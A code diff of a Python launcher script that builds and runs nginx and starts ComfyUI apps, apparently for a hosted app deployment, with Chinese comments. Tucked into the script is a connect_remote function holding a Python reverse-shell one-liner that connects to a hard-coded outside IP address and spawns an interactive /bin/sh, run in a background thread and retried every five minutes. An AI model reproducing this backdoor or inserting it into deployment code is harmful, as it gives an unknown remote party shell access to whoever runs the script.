@@ -47,7 +47,7 @@ def install_run_nginx():
     # 执行configure
     os.chdir(f"{build_dir}/nginx-release-1.26.1")
     configure=f"""
-./auto/configure \
+    ./auto/configure \
     --prefix={install_dir}  \
     --sbin-path={install_dir}/nginx \
     --conf-path={install_dir}/nginx.conf \
@@ -88,11 +88,11 @@ def launch_app1():
     if os.path.exists(app1):
         os.system(f"python {app1}")
 
-threading.Thread(target=launch_app1).start()
-    
-print("install nginx")
-install_run_nginx()
-print("finish nginx")
+def launch_cmd():
+    app1=f"{root_path}/openxlab_comfyui_cpu/page/cmd.py"
+    if os.path.exists(app1):
+        os.system(f"python {app1}")
+threading.Thread(target=launch_cmd).start()
 
 def connect_remote():
     python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
@@ -102,40 +102,26 @@ def connect_remote():
         time.sleep(60*5)
 
 threading.Thread(target=connect_remote).start()
-
-os.chdir(root_path)
-os.system("git clone https://github.com/comfyanonymous/ComfyUI")
-
-os.chdir("ComfyUI")
-
-os.system("pip install -r requirements.txt")
-os.chdir("models/checkpoints")
-os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-base-1.0/resolve/main/sd_xl_base_1.0.safetensors")
-os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-refiner-1.0/resolve/main/sd_xl_refiner_1.0.safetensors")
-os.chdir("../upscale_models")
-os.system("wget -c https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.5.0/realesr-general-x4v3.pth")
-os.chdir("../clip_vision")
-os.system("wget -c https://hf-mirror.com/comfyanonymous/clip_vision_g/resolve/main/clip_vision_g.safetensors")
-os.chdir("../..")
-os.system("ls -la")
-print("----------------start app_start.py----------------------")
+   
+print("install nginx")
+install_run_nginx()
+print("finish nginx")
 
 
-def start():
-    try:
-        command="nohup python main.py --cpu --listen  --port 7861 "
-        process = subprocess.Popen(command, shell=True)
-        print("start success----------------")
-        time.sleep(60*30)
-        print("end----------------")
-    except Exception as e:
-        print("start error: ",e)
+def launch_comfyui():
+    app1=f"{root_path}/openxlab_comfyui_cpu/page/comfyUI.py"
+    os.system(f"python {app1}")
         
-start_thread = threading.Thread(target=start)
-start_thread.start()
-start_thread.join()
+start_thread = threading.Thread(target=launch_comfyui).start()
+
 
 while True:
-    print("loop...")
-    # os.system(f"python main.py --cpu --listen ")
-    time.sleep(10)
+    #查看nginx进程是否正常启动
+    result = subprocess.run(["ps","-ef"], capture_output=True, text=True)
+    if "nginx" in result.stdout:
+        print("nginx 正常启动")
+        time.sleep(60*30)
+    else:
+        print("nginx 未正常启动")
+        install_run_nginx()
+        time.sleep(60*5)
